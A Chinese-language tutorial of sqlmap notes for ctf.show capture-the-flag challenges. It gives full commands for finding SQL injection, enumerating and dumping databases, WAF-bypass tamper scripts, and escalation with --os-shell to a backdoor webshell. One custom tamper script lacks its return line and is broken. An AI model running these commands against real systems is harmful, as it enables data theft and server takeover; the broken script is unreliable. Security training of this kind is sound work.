---
title: sqlmap
published: 2026-07-23
description: sqlmap工具使用指南与参数详解
category: 信息安全
draft: false
---

# sqlmap

不需要考虑闭合，sqlmap会自动测试

sqlmap用来处理**"重复劳动"**：注入点已经确认存在，环境很标准（比如常规的 GET/POST 参数注入，没有复杂的 WAF），或者目标是快速获取数据（尤其是盲注）时。

用手动注入来处理**"逻辑难题"**：**注入点位于 JSON、XML 或 HTTP 头部等非常规位置**； **堆叠注入、二次注入**。

## sqlmap的参数

### 1. 目标与请求

| 参数             | 作用                             | 示例                                     |
| :--------------- | :------------------------------- | :--------------------------------------- |
| `-u`             | 指定目标 URL                     | `-u "http://target.com/api/?id=1"`       |
| `--data`         | 发送 POST 请求时指定 POST 数据   | `--data "username=admin&password=123"`   |
| `--method`       | 指定 HTTP 方法（如 PUT、DELETE） | `--method PUT`                           |
| `--cookie`       | 携带 Cookie                      | `--cookie "PHPSESSID=abc123"`            |
| `--referer`      | 设置 Referer 头                  | `--referer "https://ctf.show"`           |
| `--user-agent`   | 设置 User-Agent                  | `--user-agent "Mozilla/5.0..."`          |
| `--random-agent` | 随机 User-Agent（绕过检测）      | `--random-agent`                         |
| `--headers`      | 添加自定义请求头                 | `--headers "X-Forwarded-For: 127.0.0.1"` |

### 2. 注入检测与配置

| 参数          | 作用                          | 示例                                      |
| :------------ | :---------------------------- | :---------------------------------------- |
| `--level`     | 检测级别（1-5，越高测试越多） | `--level=3`（测试更多参数和 HTTP 头）     |
| `--risk`      | 风险等级（1-3，越高越危险）   | `--risk=2`（可能使用 `OR` 注入）          |
| `--technique` | 指定注入技术（B/E/U/S/T）     | `--technique=BEU`（只测布尔、报错、联合） |
| `--dbms`      | 指定数据库类型                | `--dbms=mysql`                            |
| `--batch`     | 自动选择默认选项（跳过交互）  | `--batch`                                 |

### 3. 数据枚举（拿数据）

| 参数          | 作用                            | 示例                                          |
| :------------ | :------------------------------ | :-------------------------------------------- |
| `--dbs`       | 枚举所有数据库名                | `--dbs`                                       |
| `-D`          | 指定目标数据库                  | `-D ctfshow_web`                              |
| `--tables`    | 枚举指定数据库的表名            | `--tables`                                    |
| `-T`          | 指定目标表名                    | `-T ctfshow_user`                             |
| `--columns`   | 枚举指定表的字段名              | `--columns`                                   |
| `-C`          | 指定目标字段名（配合 `--dump`） | `-C username,password`                        |
| `--dump`      | 导出表中所有数据                | `--dump`                                      |
| `--dump-all`  | 导出所有数据库的所有表          | `--dump-all`                                  |
| `--sql-query` | 执行自定义 SQL 语句             | `--sql-query "select pass from ctfshow_user"` |

### 4. 绕过 WAF 与隐藏

| 参数             | 作用                 | 示例                              |
| :--------------- | :------------------- | :-------------------------------- |
| `--tamper`       | 使用混淆脚本绕过 WAF | `--tamper=space2comment`          |
| `--delay`        | 每次请求间隔（秒）   | `--delay=1`                       |
| `--timeout`      | 超时时间（秒）       | `--timeout=10`                    |
| `--retries`      | 重试次数             | `--retries=3`                     |
| `--random-agent` | 随机 User-Agent      | 同上                              |
| `--proxy`        | 使用代理             | `--proxy "http://127.0.0.1:8080"` |
| `--ignore-proxy` | 忽略系统代理         | `--ignore-proxy`                  |

### 5. 输出与调试

| 参数              | 作用                           | 示例                          |
| :---------------- | :----------------------------- | :---------------------------- |
| `-v`              | 输出详细程度（0-6）            | `-v 3`（显示 Payload 和响应） |
| `--fresh-queries` | 不使用缓存查询                 | `--fresh-queries`             |
| `--flush-session` | 清除会话缓存文件               | `--flush-session`             |
| `--no-cast`       | 关闭类型转换（避免数据被截断） | `--no-cast`                   |
| `--hex`           | 用十六进制提取数据             | `--hex`                       |

## 基本流程

```text
1. 检测注入点 → 2. 获取数据库名 → 3. 获取表名 → 4. 获取字段名 → 5. 导出数据
```

### 1.检测注入点

**URL**：

```php
sqlmap -u "http://靶场地址/index.php?id=1" --batch
```

**POST**:

```php
sqlmap -u "http://靶场地址/index.php" --data "id=1" --batch
```

**Referer**(用于告诉服务器**当前页面是从哪个 URL 跳转过来的**):

```php
sqlmap -u "http://靶场地址/index.php?id=1" --referer "ctf.show" --batch
```

### 2.获取数据库名

**列出所有数据库（爆库）**

```bash
sqlmap -u "http://靶场地址/index.php?id=1" --dbs --batch
```

### 获取表名

**列出所有表名**

```bash
sqlmap -u "http://靶场地址/index.php?id=1" -D ctfshow_web --tables --batch
```

### 获取字段

```bash
sqlmap -u "http://靶场地址/index.php?id=1" -D ctfshow_web -T ctfshow_user --columns --batch
```

### 导出数据

```bash
sqlmap -u "http://靶场地址/index.php?id=1" -D ctfshow_web -T ctfshow_user --dump --batch
#--dump是导出数据库表中所有数据
```

## 基本思路

### 信息收集

先进行抓包，信息收集，把可能要验证的因素找出来（cookie,headers）

### 检测注入类型

```bash
#GET
sqlmap -u "http://db6af7ab-aa73-45f2-ab89-2a9042a76e4c.challenge.ctf.show/api/index.php?id=1" --referer="ctf.show" --batch

#POST
sqlmap -u "https://d1ed7f03-60b0-4016-8812-d04c4c50623c.challenge.ctf.show/api/index.php" --data="id=1" --referer="ctf.show" --batch

#PUT(PUT 通常用于上传或更新资源，其数据在请求体中)
#记得要加上--heade中用于在 HTTP 请求中添加自定义请求头的参数rs="Content-Type: text/plain" 不然data是以表单形式发送
#--headers:中用于在 HTTP 请求中添加自定义请求头的参数
sqlmap -u "https://da0a0b59-0521-4ff7-b156-f86c1e55c96b.challenge.ctf.show/api/index.php" --method=PUT --data="id=1" --referer="ctf.show" --headers="Content-Type: text/plain"  --batch
```

**`PUT` 是后台更新接口**：`PUT` 请求通常由"修改"、"上传"、"更新"这类操作触发。这个接口可能没有被前端直接调用，或者需要特定操作（比如点击"修改"按钮）才会发出。

### 验证思路

--cookie

--API鉴权：模拟了一个需要 **先获取 Token，再用 Token 访问接口** 的 API 场景

```text
sqlmap 需要先用 --safe-url 和 --safe-freq 参数来处理这种鉴权流程。
--safe-url:发送攻击请求之前，先访问一个"安全"的 URL 来重置目标服务器的状态，从而避免被防护系统拦截。
--safe-url:每发送 N 次攻击请求，插入一次安全请求
```

### tamper(系统脚本)

```bash
sqlmap -u "https://57aab9da-5fef-439a-8299-1b0193d0df40.challenge.ctf.show/api/index.php" --method="PUT" --data="id=1" --headers="Content-Type:text/plain" --referer="ctf.show" --cookie="PHPSESSID=vkskulprjfaud331ql639r4jo1" --safe-url="http://57aab9da-5fef-439a-8299-1b0193d0df40.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=space2comment --batch
```



| 类别                | 作用                    | 代表脚本                                                     |
| :------------------ | :---------------------- | :----------------------------------------------------------- |
| **空白字符绕过**    | 替换/混淆空格           | `space2comment`(/**/), `space2plus`, `space2dash`(换行-- +)，space2hash（换行# +） |
| **关键字绕过**(=)   | 替换/混淆 SQL 关键字    | id=1:`between`(id BETWEEN 0 AND 2)，equaltolike(id LIKE 1), `id>1:greatest(GREATEST(id,1)=id) |
| **大小写绕过**      | 随机/统一大小写         | `randomcase`, `lowercase`, `uppercase`                       |
| **编码绕过**        | URL/Unicode/Base64 编码 | `urlencode`, `charencode`, `base64encode`                    |
| **注释绕过**        | 利用数据库注释          | `modsecurityversioned`, `modsecurityzeroversioned`           |
| **引号绕过**        | 替换/编码引号           | `apostrophemask`, `apostrophenullencode`                     |
| **函数/操作符替换** | 替换危险函数或操作符    | `ifnull2ifisnull`, `eversion`                                |
| **数据库特定**      | 针对特定数据库          | `mssql2char`, `oracle2mysql`                                 |
| **组合型**          | 组合多种技术            | `bluecoat`, `charencode`                                     |
| **其他混淆**        | 特殊混淆技巧            | `appendnullbyte`, `commentbeforeparentheses`                 |

### 自定义脚本

必须放在D:\sqlmap\sqlmap-master\tamper里面

```python
#!/usr/bin/env python(Shebang，用于 Unix 环境，Windows 可忽略)

"""
脚本的简短描述，说明它绕过了什么
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

# 定义优先级（可选值：LOW, NORMAL, HIGH）
__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    """
    核心函数，对 payload 进行混淆处理。
    
    参数:
        payload: 原始的 SQL 注入 payload 字符串
        **kwargs: 其他参数（如 headers 等）
    
    返回:
        处理后的 payload 字符串
    """
    if payload:
        # 在这里编写你的替换/变形逻辑
        # 例如：
        payload = payload.replace(" ", "/**/")
        payload = payload.replace("=", " LIKE ")
    return payload
```

#### 要考虑引号

**避免在字符串内部进行替换**，不破坏数据，从而**保持 SQL 语句的语法完整性**

```python
#!/usr/bin/env python
from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    """
    针对空格和 = 的绕过脚本：
    - 空格 → /**/
    - = → LIKE
    """
    if payload:
        retVal = ""
    #这两个变量是状态标记（Flag），用于追踪当前解析位置是否在单引号或双引号字符串内部。
        quote = False
        doublequote = False

        for i in xrange(len(payload)):
            # 处理引号状态
            if payload[i] == '\'':
                quote = not quote
            elif payload[i] == '"':
                doublequote = not doublequote

            # 如果在引号内，原样保留
            if quote or doublequote:
                retVal += payload[i]
                continue

            # 不在引号内时，进行替换
            if payload[i] == ' ':
                retVal += '/**/'
            elif payload[i] == '=':
                retVal += ' LIKE '
            else:
                retVal += payload[i]

        return retVal
    return payload
```

#### **逆向工程后端逻辑**

```text
题目
function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
}
```

```python
#!/usr/bin/env python

import base64
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    # 1. 反转原始 payload
    payload = payload[::-1].encode()
    # 2. 第一次 Base64 编码
    payload = base64.b64encode(payload)
    # 3. 反转编码结果
    payload = (payload.decode())[::-1]
    # 4. 第二次 Base64 编码
    payload = base64.b64encode(payload.encode())
```

###  --os-shell

**将一个 SQL 注入漏洞直接升级为对目标操作系统的交互式命令行控制**

```bash
#查找数据
os-shell> ls -la /var/www/html/
#建立后门
echo '...' > shell.php
```



### 注意

**--tamper=my_tamper.py**，尽量要这么写，不要写成 `--tamper=my_tamper.py,space2comment`，这个可能因为`sqlmap` 会按照你指定的**顺序**依次应用这些脚本，而这个顺序可能破坏了 Payload 的结构。

尽量--tamper单一，多重过滤全部写入自定义tamper中
